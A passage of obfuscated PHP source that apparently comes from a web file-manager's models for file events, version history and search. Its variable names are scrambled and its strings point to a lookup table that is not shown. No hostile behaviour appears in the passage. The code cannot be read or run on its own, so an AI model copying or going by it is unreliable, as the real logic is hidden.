$œ‰¨¥–Î) { if ($¹Ùç€âô[$_SERVER[ú‡®¯¨±][180]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($ø›µÚãÊ, $´­Ğ¦‡ƒ) { $ÇåÄûÙ¯ =& $_SERVER[ú‡®¯¨±]; $é¸ï†Íò = Model($ÇåÄûÙ¯[1389])->sourceInfo($ø›µÚãÊ); $ÊÁŠ«ò´ = array($ÇåÄûÙ¯[2133] => $´­Ğ¦‡ƒ, $ÇåÄûÙ¯[32] => $é¸ï†Íò[$ÇåÄûÙ¯[32]]); return $this->addEvent($ø›µÚãÊ, $ÇåÄûÙ¯[2132], $ÊÁŠ«ò´); } public function eventFileEdit($±Š‘¹½») { $™Ãéç¾î =& $_SERVER[ú‡®¯¨±]; $åêéíÅ„ = array($™Ãéç¾î[2139] => $_SERVER[$™Ãéç¾î[2140]], $™Ãéç¾î[2141] => strtolower(ACTION)); if (isset($GLOBALS[$™Ãéç¾î[7]][$™Ãéç¾î[2142]])) { $åêéíÅ„[$™Ãéç¾î[2142]] = $™Ãéç¾î[90]; } return $this->addEvent($±Š‘¹½», $™Ãéç¾î[1876], $åêéíÅ„); } public function eventRecycle($£ı»±şÈ, $Ş’Ô—ªÇ) { return $this->addEvent($£ı»±şÈ, $_SERVER[ú‡®¯¨±][2134], $Ş’Ô—ªÇ); } public function eventRemove($ıäÈÓµ§) { $¾¡¦ºû¢ =& $_SERVER[ú‡®¯¨±]; $ÏÇÊ‰»´ = Model($¾¡¦ºû¢[1389])->sourceInfo($ıäÈÓµ§); $ß½™÷ = $ÏÇÊ‰»´[$¾¡¦ºû¢[32]]; return $this->addEvent($ÏÇÊ‰»´[$¾¡¦ºû¢[182]], $¾¡¦ºû¢[1875], $ß½™÷); } public function eventShare($ìë¦ÏÓÍ, $Õò«³Ö°) { return $this->addEvent($ìë¦ÏÓÍ, $_SERVER[ú‡®¯¨±][1886], $Õò«³Ö°); } public function eventMove($ãŞòøÔ¹, $ÏÄÚÌ€î, $ìÙúæœÍ) { $¨Ä«Ææ’ =& $_SERVER[ú‡®¯¨±]; $ø¿‰üÈÇ = Model($¨Ä«Ææ’[1389]); $ì“‡Œ¡ô = $ø¿‰üÈÇ->sourceInfo($ãŞòøÔ¹); $ÛÈÉ·› = $ø¿‰üÈÇ->sourceInfo($ÏÄÚÌ€î); $•Ä‘§æ§ = $ø¿‰üÈÇ->sourceInfo($ìÙúæœÍ); $ºô½†‡¤ = array($¨Ä«Ææ’[1216] => $ÏÄÚÌ€î, $¨Ä«Ææ’[2143] => $ÛÈÉ·›[$¨Ä«Ææ’[32]], $¨Ä«Ææ’[2120] => !empty($ÛÈÉ·›[$¨Ä«Ææ’[561]]) ? $ÛÈÉ·›[$¨Ä«Ææ’[561]] : $¨Ä«Ææ’[12], $¨Ä«Ææ’[1217] => $ìÙúæœÍ, $¨Ä«Ææ’[2144] => $•Ä‘§æ§[$¨Ä«Ææ’[32]], $¨Ä«Ææ’[2145] => !empty($•Ä‘§æ§[$¨Ä«Ææ’[561]]) ? $•Ä‘§æ§[$¨Ä«Ææ’[561]] : $¨Ä«Ææ’[12]); $this->addEvent($ãŞòøÔ¹, $¨Ä«Ææ’[598], $ºô½†‡¤); $ì“‡Œ¡ô = $ø¿‰üÈÇ->sourceInfo($ãŞòøÔ¹); $ºô½†‡¤ = array($¨Ä«Ææ’[183] => $ì“‡Œ¡ô[$¨Ä«Ææ’[183]], $¨Ä«Ææ’[32] => $ì“‡Œ¡ô[$¨Ä«Ææ’[32]]); $this->addEvent($ÏÄÚÌ€î, $¨Ä«Ææ’[2146], $ºô½†‡¤); } public function eventCopy($É¸²Íæ™) { $this->eventCreate($É¸²Íæ™, $_SERVER[ú‡®¯¨±][596]); } public function eventRename($ÂÚ¢ö©µ, $•´ùÌ˜ä, $ÃÒ’Ø˜İ) { $ôŠÓß±ı =& $_SERVER[ú‡®¯¨±]; $â¼ÆôÍÏ = array($ôŠÓß±ı[1216] => $•´ùÌ˜ä, $ôŠÓß±ı[1217] => $ÃÒ’Ø˜İ); return $this->addEvent($ÂÚ¢ö©µ, $ôŠÓß±ı[1403], $â¼ÆôÍÏ); } public function eventAddComment($»Æ™‘Äˆ, $åÍõŞûµ) { return $this->addEvent($»Æ™‘Äˆ, $_SERVER[ú‡®¯¨±][2147], $åÍõŞûµ); } public function eventAddDesc($òÖå‹ù, $Ö¬—¹õş) { return $this->addEvent($òÖå‹ù, $_SERVER[ú‡®¯¨±][2148], $Ö¬—¹õş); } public function listBySource($‘˜ÊÚŸ‡) { $ÒµíÂ‰ =& $_SERVER[ú‡®¯¨±]; $ûìÁóîñ = Model($ÒµíÂ‰[1389])->sourceInfo($‘˜ÊÚŸ‡); $©ôí = array($ÒµíÂ‰[469] => $‘˜ÊÚŸ‡); if ($ûìÁóîñ[$ÒµíÂ‰[463]] == $ÒµíÂ‰[90]) { $¹Ÿ„Š·ú = Model($ÒµíÂ‰[1389])->listSearchChildren($‘˜ÊÚŸ‡, 20000); $¹Ÿ„Š·ú[] = $‘˜ÊÚŸ‡ . $ÒµíÂ‰[211]; $©ôí = array($ÒµíÂ‰[183] => array($ÒµíÂ‰[7], $¹Ÿ„Š·ú)); } $ğŸòš»§ = $this->where($©ôí)->order($ÒµíÂ‰[2149])->selectPage(); if ($ğŸòš»§[$ÒµíÂ‰[421]][$ÒµíÂ‰[422]] == 0) { $ğŸòš»§[$ÒµíÂ‰[421]][$ÒµíÂ‰[422]] = 1; $ğŸòš»§[$ÒµíÂ‰[424]] = array(array($ÒµíÂ‰[469] => $‘˜ÊÚŸ‡, $ÒµíÂ‰[2130] => $ûìÁóîñ[$ÒµíÂ‰[182]], $ÒµíÂ‰[1699] => $ûìÁóîñ[$ÒµíÂ‰[505]], $ÒµíÂ‰[474] => $ÒµíÂ‰[2150], $ÒµíÂ‰[475] => $ûìÁóîñ[$ÒµíÂ‰[227]], $ÒµíÂ‰[1701] => $ÒµíÂ‰[12])); } return $this->eventListParse($ğŸòš»§, $‘˜ÊÚŸ‡); } private function eventListParse($â©¥§İ«, $ñòš”ø×) { $óê¸¤°­ =& $_SERVER[ú‡®¯¨±]; $¶‘ÏÉË = $â©¥§İ«[$óê¸¤°­[424]]; $àåŒöÊ¶ = array_to_keyvalue($¶‘ÏÉË, $óê¸¤°­[12], $óê¸¤°­[183]); $ÆÍ¦ÉÌ = array_to_keyvalue($¶‘ÏÉË, $óê¸¤°­[12], $óê¸¤°­[2136]); foreach ($¶‘ÏÉË as $ß€‰À¤«) { $©ÀçÖºÆ = $ß€‰À¤«[$óê¸¤°­[504]]; if ($ß€‰À¤«[$óê¸¤°­[33]] == $óê¸¤°­[598] && isset($©ÀçÖºÆ[$óê¸¤°­[1216]])) { $àåŒöÊ¶[] = $©ÀçÖºÆ[$óê¸¤°­[1216]] . $óê¸¤°­[12]; $àåŒöÊ¶[] = $©ÀçÖºÆ[$óê¸¤°­[1217]] . $óê¸¤°­[12]; } if ($ß€‰À¤«[$óê¸¤°­[33]] == $óê¸¤°­[2146] && isset($©ÀçÖºÆ[$óê¸¤°­[183]])) { $àåŒöÊ¶[] = $©ÀçÖºÆ[$óê¸¤°­[183]] . $óê¸¤°­[12]; } } $àåŒöÊ¶ = array_merge($àåŒöÊ¶, $ÆÍ¦ÉÌ, array($ñòš”ø× . $óê¸¤°­[12])); $àåŒöÊ¶ = array_unique($àåŒöÊ¶); $âå—¢İ = array_unique(array_to_keyvalue($¶‘ÏÉË, $óê¸¤°­[12], $óê¸¤°­[1708])); $ĞÃ£”Ì¢ = Model($óê¸¤°­[577])->userListInfo($âå—¢İ); $–µëÎ² = Model($óê¸¤°­[880])->sourceListInfo($àåŒöÊ¶, !0); foreach ($¶‘ÏÉË as &$ß€‰À¤«) { if ($ß€‰À¤«[$óê¸¤°­[33]] == $óê¸¤°­[598] && isset($ß€‰À¤«[$óê¸¤°­[504]][$óê¸¤°­[1216]])) { $ß€‰À¤«[$óê¸¤°­[504]][$óê¸¤°­[1216]] = $–µëÎ²[$ß€‰À¤«[$óê¸¤°­[504]][$óê¸¤°­[1216]]]; $ß€‰À¤«[$óê¸¤°­[504]][$óê¸¤°­[1217]] = $–µëÎ²[$ß€‰À¤«[$óê¸¤°­[504]][$óê¸¤°­[1217]]]; } if ($ß€‰À¤«[$óê¸¤°­[33]] == $óê¸¤°­[2146] && isset($ß€‰À¤«[$óê¸¤°­[504]][$óê¸¤°­[183]])) { $ß€‰À¤«[$óê¸¤°­[504]][$óê¸¤°­[183]] = $–µëÎ²[$ß€‰À¤«[$óê¸¤°­[504]][$óê¸¤°­[183]]]; } $ß€‰À¤«[$óê¸¤°­[89]] = $–µëÎ²[$ß€‰À¤«[$óê¸¤°­[183]]]; $ß€‰À¤«[$óê¸¤°­[2151]] = $–µëÎ²[$ß€‰À¤«[$óê¸¤°­[2136]]]; if ($ß€‰À¤«[$óê¸¤°­[33]] == $óê¸¤°­[1875]) { $ß€‰À¤«[$óê¸¤°­[2151]] = $ß€‰À¤«[$óê¸¤°­[89]]; $ß€‰À¤«[$óê¸¤°­[2136]] = $ß€‰À¤«[$óê¸¤°­[2151]][$óê¸¤°­[183]]; $ß€‰À¤«[$óê¸¤°­[89]] = !1; $ß€‰À¤«[$óê¸¤°­[183]] = $óê¸¤°­[12]; } $ß€‰À¤«[$óê¸¤°­[2078]] = $ĞÃ£”Ì¢[$ß€‰À¤«[$óê¸¤°­[1708]]]; } unset($ß€‰À¤«); $â©¥§İ«[$óê¸¤°­[424]] = $¶‘ÏÉË; return $â©¥§İ«; } public function removeBySource($óÇÈŒ¢¥) { $°ÔÀƒÅÈ = array($_SERVER[ú‡®¯¨±][469] => $óÇÈŒ¢¥); $this->where($°ÔÀƒÅÈ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\x75\162\143\x65\x5f\150\x69\163\164\x6f\162\x79"; public function historyCount($€ÄéÆÍ´) { $¸ĞÔœºè =& $_SERVER[ú‡®¯¨±]; if (!$€ÄéÆÍ´) { return array(); } if (is_string($€ÄéÆÍ´) || is_int($€ÄéÆÍ´)) { $€ÄéÆÍ´ = array($€ÄéÆÍ´); } $³Ö±ğ‹ì = array($¸ĞÔœºè[183], $¸ĞÔœºè[1939] => $¸ĞÔœºè[544]); $ıåË«çØ = array($¸ĞÔœºè[183] => array($¸ĞÔœºè[7], $€ÄéÆÍ´)); $“«ÔÑÚ‚ = $this->field($³Ö±ğ‹ì)->where($ıåË«çØ)->group($¸ĞÔœºè[183])->select(); return array_to_keyvalue($“«ÔÑÚ‚, $¸ĞÔœºè[183], $¸ĞÔœºè[544]); } public function addHistory($£’ş„œñ, $—‹Àñ—· = '') { $İËóğ × =& $_SERVER[ú‡®¯¨±]; $×–ÄıïÅ = array($İËóğ ×[469] => $£’ş„œñ[$İËóğ ×[183]], $İËóğ ×[1699] => isset($£’ş„œñ[$İËóğ ×[507]]) ? $£’ş„œñ[$İËóğ ×[507]] : $£’ş„œñ[$İËóğ ×[505]], $İËóğ ×[520] => $£’ş„œñ[$İËóğ ×[519]], $İËóğ ×[595] => $£’ş„œñ[$İËóğ ×[78]], $İËóğ ×[2152] => $—‹Àñ—·); if ($GLOBALS[$İËóğ ×[6]][$İËóğ ×[91]][$İËóğ ×[1273]] >= 1) { $this->historyAutoClear($×–ÄıïÅ[$İËóğ ×[183]]); $this->add($×–ÄıïÅ); } Hook::trigger($İËóğ ×[2153], $×–ÄıïÅ); Model($İËóğ ×[2154])->eventFileEdit($£’ş„œñ[$İËóğ ×[183]]); } private function historyAutoClear($ˆàÈÈå†) { $‹áç—á« =& $_SERVER[ú‡®¯¨±]; $¸…òÖñ’ = Model($‹áç—á«[825])->get($‹áç—á«[1295]); $®Û½‚¼Å = intval($GLOBALS[$‹áç—á«[6]][$‹áç—á«[91]][$‹áç—á«[1273]]); $µÖ°î€ş = $¸…òÖñ’ == $‹áç—á«[1296] ? min(5, $®Û½‚¼Å) : $®Û½‚¼Å; $µÖ°î€ş = $µÖ°î€ş <= 0 ? 0 : $µÖ°î€ş - 1; if ($µÖ°î€ş >= 500) { return; } $º¶›Ø§Ê = array($‹áç—á«[469] => $ˆàÈÈå†); $Œ¡êÕœ— = $this->field($‹áç—á«[2155])->where($º¶›Ø§Ê)->order($‹áç—á«[2149])->select(); if (!$Œ¡êÕœ— || $µÖ°î€ş >= count($Œ¡êÕœ—)) { return; } $ºí¦œò = array_to_keyvalue($Œ¡êÕœ—, $‹áç—á«[12], $‹áç—á«[453]); $ºí¦œò = array_slice($ºí¦œò, $µÖ°î€ş); $Í»ÆÔÀ = array_to_keyvalue($Œ¡êÕœ—, $‹áç—á«[12], $‹áç—á«[519]); $Í»ÆÔÀ = array_slice($Í»ÆÔÀ, $µÖ°î€ş); if (!$ºí¦œò || !$Í»ÆÔÀ) { return; } $º¶›Ø§Ê = array($‹áç—á«[471] => array($‹áç—á«[7], $ºí¦œò)); $this->where($º¶›Ø§Ê)->delete(); Model($‹áç—á«[522])->remove($Í»ÆÔÀ); } public function listData($åÅĞ·Æİ) { $áÇØÍ =& $_SERVER[ú‡®¯¨±]; $»ı‚ç½ = array($áÇØÍ[469] => $åÅĞ·Æİ); $Ì‡Äâ’Ò = $áÇØÍ[2156]; $öºıëÁ = $this->field($Ì‡Äâ’Ò)->where($»ı‚ç½)->order($áÇØÍ[2149])->selectPage(); $this->_listAppendUser($öºıëÁ[$áÇØÍ[424]]); $ØÀ¿¥›£ = Model($áÇØÍ[825])->get($áÇØÍ[1295]); $óúÇÁÕ± = 5; if ($ØÀ¿¥›£ == $áÇØÍ[1296]) { $öºıëÁ[$áÇØÍ[424]] = array_slice($öºıëÁ[$áÇØÍ[424]], 0, $óúÇÁÕ±); $öºıëÁ[$áÇØÍ[421]] = array($áÇØÍ[2157] => 1, $áÇØÍ[2158] => 20, $áÇØÍ[2159] => 1, $áÇØÍ[2160] => count($öºıëÁ[$áÇØÍ[424]])); } return $öºıëÁ; } protected function _listAppendUser(&$Õ§òŒë) { $íˆš´½³ =& $_SERVER[ú‡®¯¨±]; $İà’’ı = array_to_keyvalue($Õ§òŒë, $íˆš´½³[12], $íˆš´½³[1708]); $¦é²Õ½Ñ = Model($íˆš´½³[577])->userListInfo($İà’’ı); foreach ($Õ§òŒë as &$ä†çüğŠ) { $­îñ ùÚ = $ä†çüğŠ[$íˆš´½³[1708]]; $ä†çüğŠ[$íˆš´½³[505]] = $¦é²Õ½Ñ[$­îñ ùÚ] ? $¦é²Õ½Ñ[$­îñ ùÚ] : !1; } unset($ä†çüğŠ); } public function fileInfo($ÉƒéŞ“ş) { $çÕ¢ñş‘ =& $_SERVER[ú‡®¯¨±]; $¿É°ë = $this->tablePrefix; $Ê¶Îï = "{$¿É°ë}\151\x6f\x5f\146\151\x6c\145\x20\x66\x69\x6c\x65\x73\x20\x6f\x6e\40\146\151\x6c\145\163\x2e\x66\151\154\145\111\104\x20\75\40\150\x69\x73\x74\x6f\162\x79\x2e\146\x69\x6c\145\x49\x44"; return $this->alias($çÕ¢ñş‘[2161])->where(array($çÕ¢ñş‘[471] => $ÉƒéŞ“ş))->join($Ê¶Îï, $çÕ¢ñş‘[2162])->find(); } public function removeItem($‚ÀªñÅ‡) { $¹–¥Â‚ =& $_SERVER[ú‡®¯¨±]; $á¸·à²ü = array($¹–¥Â‚[471] => $‚ÀªñÅ‡); $ˆÔëú™— = $this->where($á¸·à²ü)->find(); if ($ˆÔëú™—) { $ì¾‚ïÈ¨ = $this->where($á¸·à²ü)->delete(); Model($¹–¥Â‚[522])->remove($ˆÔëú™—[$¹–¥Â‚[519]]); return $ì¾‚ïÈ¨; } return !1; } public function removeBySource($±ØÀøïî) { $æã°® =& $_SERVER[ú‡®¯¨±]; if (!$±ØÀøïî) { return !1; } if (!is_array($±ØÀøïî)) { $±ØÀøïî = array($±ØÀøïî); } $å©™í¤Â = array($æã°®[469] => array($æã°®[7], $±ØÀøïî)); $–ÅŞ¹‘‚ = $this->field($æã°®[520])->where($å©™í¤Â)->select(); if ($–ÅŞ¹‘‚) { $this->where($å©™í¤Â)->delete(); $‰ÎÈÍ¢· = array_to_keyvalue($–ÅŞ¹‘‚, $æã°®[12], $æã°®[519]); Model($æã°®[522])->remove($‰ÎÈÍ¢·); } return !0; } public function setDetail($ÃÙœ, $Î±Çó°ğ) { $¢®Õ‡øÑ =& $_SERVER[ú‡®¯¨±]; return $this->where(array($¢®Õ‡øÑ[471] => $ÃÙœ))->save(array($¢®Õ‡øÑ[2152] => $Î±Çó°ğ)); } public function rollbackToItem($Äê’•, $Üè¢ÛÔ·) { $¿øê¤õï =& $_SERVER[ú‡®¯¨±]; $ßŒ™Õïá = Model($¿øê¤õï[880])->sourceInfo($Äê’•); $this->addHistory($ßŒ™Õïá, LNG($¿øê¤õï[2163])); $ŞâŠ©¥Â = $this->find($Üè¢ÛÔ·); $–ü”§ï = array($¿øê¤õï[519] => $ŞâŠ©¥Â[$¿øê¤õï[519]], $¿øê¤õï[78] => $ŞâŠ©¥Â[$¿øê¤õï[78]], $¿øê¤õï[87] => time(), $¿øê¤õï[507] => USER_ID); Model($¿øê¤õï[880])->where(array($¿øê¤õï[183] => $Äê’•))->save($–ü”§ï); return $this->where(array($¿øê¤õï[471] => $Üè¢ÛÔ·))->delete(); } public function clearSame($­ËÒ½´±) { $Õ†÷‡ =& $_SERVER[ú‡®¯¨±]; $é™ÛÔ = $this->listData($­ËÒ½´±); $×®ÊÎæ = array_to_keyvalue_group($é™ÛÔ, $Õ†÷‡[519]); $èíæéµÈ = array(); $²—Ïó‚ = array(); foreach ($×®ÊÎæ as $ëÕ«½Âç) { if (!$ëÕ«½Âç || count($ëÕ«½Âç) <= 1) { continue; } foreach ($ëÕ«½Âç as $‰¼È°áû) { $èíæéµÈ[] = $‰¼È°áû[$Õ†÷‡[519]]; $²—Ïó‚[] = $‰¼È°áû[$Õ†÷‡[453]]; } } if (!$²—Ïó‚) { return; } $this->where(array($Õ†÷‡[453] => array($Õ†÷‡[7], $²—Ïó‚)))->delete(); Model($Õ†÷‡[522])->remove($èíæéµÈ); } public function userSpace() { $ğ©ÇÀŞ° =& $_SERVER[ú‡®¯¨±]; $§ÖÖ‚¼ö = $this->tablePrefix; $Õº—Êıö = array($ğ©ÇÀŞ°[1699] => USER_ID); $Æõ ïÔĞ = "{$§ÖÖ‚¼ö}\151\157\x5f\x66\x69\154\x65\x20\146\151\154\x65\x73\x20\157\156\x20\146\151\154\x65\x73\x2e\146\x69\154\145\111\104\40\75\40\x68\x69\163\164\157\x72\x79\x2e\146\x69\x6c\x65\111\104"; return $this->alias($ğ©ÇÀŞ°[2161])->where($Õº—Êıö)->join($Æõ ïÔĞ, $ğ©ÇÀŞ°[2162])->sum($ğ©ÇÀŞ°[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ÙÆû–) { $ÙÉ½â¤ë =& $_SERVER[ú‡®¯¨±]; $İ€ü´†Í = KodIO::fileTypeList(); $Ç£Ò¯§Ü = $İ€ü´†Í[$ÙÆû–]; if (!$Ç£Ò¯§Ü) { return array(); } $ñÖÓ†şÊ = $Ç£Ò¯§Ü[$ÙÉ½â¤ë[177]]; $ÛŒõÔ¨Ç = $ÙÉ½â¤ë[7]; if (!$Ç£Ò¯§Ü[$ÙÉ½â¤ë[177]]) { $œ’îêú = array_to_keyvalue($İ€ü´†Í, $ÙÉ½â¤ë[12], $ÙÉ½â¤ë[177]); $ñÖÓ†şÊ = implode($ÙÉ½â¤ë[50], $œ’îêú); $ÛŒõÔ¨Ç = $ÙÉ½â¤ë[2164]; } $ÛèÁ§ª = explode($ÙÉ½â¤ë[50], trim($ñÖÓ†şÊ, $ÙÉ½â¤ë[50])); return array($ÛŒõÔ¨Ç, $ÛèÁ§ª); } public function listPathType($½éôœÇ) { $•Ó–÷Â§ =& $_SERVER[ú‡®¯¨±]; $•½ÅòË = $this->fileTypeWhere($½éôœÇ); if (!$•½ÅòË) { return array(); } $ÜÛÊâù› = USER_ID; $Äß²„»Ã = Model($•Ó–÷Â§[577])->getInfo($ÜÛÊâù›); $¸¶©•ä = array($•Ó–÷Â§[626] => SourceModel::TYPE_USER, $•Ó–÷Â§[563] => array($•Ó–÷Â§[590], $•Ó–÷Â§[573] . $Äß²„»Ã[$•Ó–÷Â§[89]][$•Ó–÷Â§[183]] . $•Ó–÷Â§[591]), $•Ó–÷Â§[627] => $ÜÛÊâù›, $•Ó–÷Â§[624] => 0, $•Ó–÷Â§[625] => $•½ÅòË); return $this->listSource($¸¶©•ä); } public function listSearch($¹ä±•±», $ˆ¬¡Íİø = 300) { $×Æˆ§È« =& $_SERVER[ú‡®¯¨±]; if (isset($¹ä±•±»[$×Æˆ§È«[2000]]) && $¹ä±•±»[$×Æˆ§È«[2000]]) { $¹ä±•±»[$×Æˆ§È«[2000]] = str_replace($×Æˆ§È«[438], $×Æˆ§È«[2165], trim($¹ä±•±»[$×Æˆ§È«[2000]])); } $—šÄ¾ºé = $this->_parseSearchWhere($¹ä±•±»); if (!isset($—šÄ¾ºé[$×Æˆ§È«[483]])) { $—šÄ¾ºé[$×Æˆ§È«[483]] = 0; } $ÛÆŒôÍš = $×Æˆ§È«[2166]; $ÉŞÅ’Ç³ = $—šÄ¾ºé; $õ÷¨Ëˆ¶ = $ÛÆŒôÍš; $this->_listSearchBindPinyin($¹ä±•±», $—šÄ¾ºé, $ÛÆŒôÍš); $this->alias($×Æˆ§È«[497])->_makeOrder(); $—šÄ¾ºé = $this->parseWhereLike($—šÄ¾ºé); $ªğúˆñØ = $this->distinct(!0)->field($ÛÆŒôÍš)->where($—šÄ¾ºé)->selectPage($ˆ¬¡Íİø); if ($GLOBALS[$×Æˆ§È«[6]][$×Æˆ§È«[435]][$×Æˆ§È«[436]] && Input::check($¹ä±•±»[$×Æˆ§È«[2000]], $×Æˆ§È«[633]) && $ªğúˆñØ[$×Æˆ§È«[421]][$×Æˆ§È«[408]] == 1 && $ªğúˆñØ[$×Æˆ§È«[421]][$×Æˆ§È«[422]] == 0) { $ªğúˆñØ = $this->distinct(!0)->field($ÛÆŒôÍš)->where($ÉŞÅ’Ç³)->limit(1000)->select(); $ªğúˆñØ = array_page_split($ªğúˆñØ, !1, $ˆ¬¡Íİø); } $this->_listSearchFileContent($ªğúˆñØ, $¹ä±•±», $õ÷¨Ëˆ¶, $ÉŞÅ’Ç³); $this->_listSearchDesc($ªğúˆñØ, $¹ä±•±», $õ÷¨Ëˆ¶); $this->_listSearchTag($ªğúˆñØ, $¹ä±•±», $õ÷¨Ëˆ¶); $this->_listSearchGroupTag($ªğúˆñØ, $¹ä±•±», $õ÷¨Ëˆ¶); $this->_listDataApply($ªğúˆñØ[$×Æˆ§È«[424]]); $this->_listMake($ªğúˆñØ); return $ªğúˆñØ; } private function _listSearchFileContent(&$Åí¯øşÓ, $×ëÚÛ¹İ, $øÅ·› ¥, $ÂÎşÜ‘) { $êŠúÒ™‰ =& $_SERVER[ú‡®¯¨±]; if (!$×ëÚÛ¹İ[$êŠúÒ™‰[2000]] || $Åí¯øşÓ[$êŠúÒ™‰[421]][$êŠúÒ™‰[408]] > 1) { return; } if (!isset($ÂÎşÜ‘[$êŠúÒ™‰[32]]) || !is_array($×ëÚÛ¹İ[$êŠúÒ™‰[519]])) { return; } $ÂÎşÜ‘[$êŠúÒ™‰[519]] = array($êŠúÒ™‰[7], $×ëÚÛ¹İ[$êŠúÒ™‰[519]]); unset($ÂÎşÜ‘[$êŠúÒ™‰[32]]); unset($×ëÚÛ¹İ[$êŠúÒ™‰[519]]); $Ù½ˆ¬Áœ = $this->field($øÅ·› ¥)->where($ÂÎşÜ‘)->limit($êŠúÒ™‰[2167])->select(); if (!$Ù½ˆ¬Áœ || count($Ù½ˆ¬Áœ) == 0) { return; } $Åí¯øşÓ[$êŠúÒ™‰[424]] = array_merge($Ù½ˆ¬Áœ, $Åí¯øşÓ[$êŠúÒ™‰[424]]); $Åí¯øşÓ[$êŠúÒ™‰[421]][$êŠúÒ™‰[422]] += count($Ù½ˆ¬Áœ); } private function _listSearchTag(&$Õ§Æñ¢á, $ÆÆÌÍ², $¿…ÃÆŒ£) { $ê ää‹— =& $_SERVER[ú‡®¯¨±]; if (!$ÆÆÌÍ²[$ê ää‹—[2000]] || $Õ§Æñ¢á[$ê ää‹—[421]][$ê ää‹—[408]] > 1) { return; } $¿ì¾—Ú = Model($ê ää‹—[2168])->listData(); $¨ú•î¶ = array(); $‘í¢á¼– = $ÆÆÌÍ²[$ê ää‹—[2000]]; foreach ($¿ì¾—Ú as $Ë„Êæ¨Ÿ) { $¸¹°ë« = $Ë„Êæ¨Ÿ[$ê ää‹—[32]]; $™ç´Şøô = str_replace($ê ää‹—[53], $ê ää‹—[12], Pinyin::get($¸¹°ë«)); if (stripos($¸¹°ë«, $‘í¢á¼–) !== !1 || stripos($™ç´Şøô, $‘í¢á¼–) !== !1) { $¨ú•î¶[] = $Ë„Êæ¨Ÿ[$ê ää‹—[453]]; } } if (!$¨ú•î¶) { return; } $˜ ­Ú±» = array($ê ää‹—[478] => array($ê ää‹—[7], $¨ú•î¶), $ê ää‹—[1708] => USER_ID); $ÛüœÂ›¸ = Model($ê ää‹—[480])->field($ê ää‹—[86])->where($˜ ­Ú±»)->select(); $ÛüœÂ›¸ = array_to_keyvalue($ÛüœÂ›¸, $ê ää‹—[12], $ê ää‹—[86]); $€‚¾„İ = array_unique($ÛüœÂ›¸); $this->_listSearchMerge($Õ§Æñ¢á, $ÆÆÌÍ², $¿…ÃÆŒ£, $€‚¾„İ); } private function _listSearchDesc(&$Ùº’é¤ğ, $ñÙ…ôõ÷, $àÎÎØòù) { $´¼³š« =& $_SERVER[ú‡®¯¨±]; if (!$ñÙ…ôõ÷[$´¼³š«[2000]] || $Ùº’é¤ğ[$´¼³š«[421]][$´¼³š«[408]] > 1) { return; } $ú®Ñò  = array($´¼³š«[96] => $´¼³š«[504], $´¼³š«[429] => array($´¼³š«[437], $´¼³š«[2002] . $ñÙ…ôõ÷[$´¼³š«[2000]] . $´¼³š«[2002])); $ĞéØÇ€ = !1; if ($ĞéØÇ€) { $¦ïØ¬°ğ = $this->listSearchChildren($ñÙ…ôõ÷[$´¼³š«[182]]); $¦ïØ¬°ğ = array_unique($¦ïØ¬°ğ); if (!$¦ïØ¬°ğ) { return; } $ú®Ñò [$´¼³š«[183]] = array($´¼³š«[7], $¦ïØ¬°ğ); } $ã§·œİˆ = Model($´¼³š«[610])->field($´¼³š«[183])->where($ú®Ñò )->limit(5000)->select(); $õšùß³è = array_to_keyvalue($ã§·œİˆ, $´¼³š«[12], $´¼³š«[183]); $this->_listSearchMerge($Ùº’é¤ğ, $ñÙ…ôõ÷, $àÎÎØòù, $õšùß³è); } private function _listSearchGroupTag(&$ßõÌ¦â, $ù”¢ˆ‹, $”‘ö²ùÌ) { $µäÄ„­ =& $_SERVER[ú‡®¯¨±]; if (!$ù”¢ˆ‹[$µäÄ„­[2000]] || $ßõÌ¦â[$µäÄ„­[421]][$µäÄ„­[408]] > 1 || !$ù”¢ˆ‹[$µäÄ„­[182]]) { return; } $Ëóşî˜¿ = $this->sourceInfo($ù”¢ˆ‹[$µäÄ„­[182]]); if (!$Ëóşî˜¿ || $Ëóşî˜¿[$µäÄ„­[180]] != SourceModel::TYPE_GROUP) { return; } $è¤ù¥Ü¨ = $Ëóşî˜¿[$µäÄ„­[548]]; $ï¿åÕƒ¥ = Model($µäÄ„­[2169])->get($è¤ù¥Ü¨); $¿”°èÔÖ = array(); $Òéñ–¾£ = $ù”¢ˆ‹[$µäÄ„­[2000]]; foreach ($ï¿åÕƒ¥[$µäÄ„­[424]] as $Ûü¥Äå) { $õîèÑã = $Ûü¥Äå[$µäÄ„­[32]]; $áı¿ŸÔĞ = str_replace($µäÄ„­[53], $µäÄ„­[12], Pinyin::get($õîèÑã)); if (stripos($õîèÑã, $Òéñ–¾£) !== !1 || stripos($áı¿ŸÔĞ, $Òéñ–¾£) !== !1) { $¿”°èÔÖ[] = $Ûü¥Äå[$µäÄ„­[453]]; } } if (!$¿”°èÔÖ) { return; } $îæ†“ºª = array($µäÄ„­[478] => array($µäÄ„­[7], $¿”°èÔÖ), $µäÄ„­[1708] => 0, $µäÄ„­[33] => $µäÄ„­[2022] . $è¤ù¥Ü¨); $Êò¼¼˜³ = Model($µäÄ„­[480])->field($µäÄ„­[86])->where($îæ†“ºª)->select(); $Êò¼¼˜³ = array_to_keyvalue($Êò¼¼˜³, $µäÄ„­[12], $µäÄ„­[86]); $†•ğòÍ = array_unique($Êò¼¼˜³); $this->_listSearchMerge($ßõÌ¦â, $ù”¢ˆ‹, $”‘ö²ùÌ, $†•ğòÍ); } private function _listSearchMerge(&$ıÇ‹åàâ, $ÑåÓğÌî, $­ÓÉ—¡Ö, $æ´»‡Òš) { $Æı›¢ =& $_SERVER[ú‡®¯¨±]; if (!$æ´»‡Òš) { return; } $°‹ÚÎÒ¶ = array_to_keyvalue($ıÇ‹åàâ[$Æı›¢[424]], $Æı›¢[12], $Æı›¢[183]); $Àİ€şù = array_diff($æ´»‡Òš, $°‹ÚÎÒ¶); if (!$Àİ€şù) { return; } $õŒÓäæ‘ = array($Æı›¢[183] => array($Æı›¢[7], $Àİ€şù)); $­²İö¹© = $this->field($­ÓÉ—¡Ö)->where($õŒÓäæ‘)->select(); if (!$­²İö¹©) { return; } $²Á‰øÊ• = array(); foreach ($­²İö¹© as $­ÓÇÄÍ¯) { if ($this->_listSearchFilter($­ÓÇÄÍ¯, $ÑåÓğÌî)) { $²Á‰øÊ•[] = $­ÓÇÄÍ¯; } } $ıÇ‹åàâ[$Æı›¢[424]] = 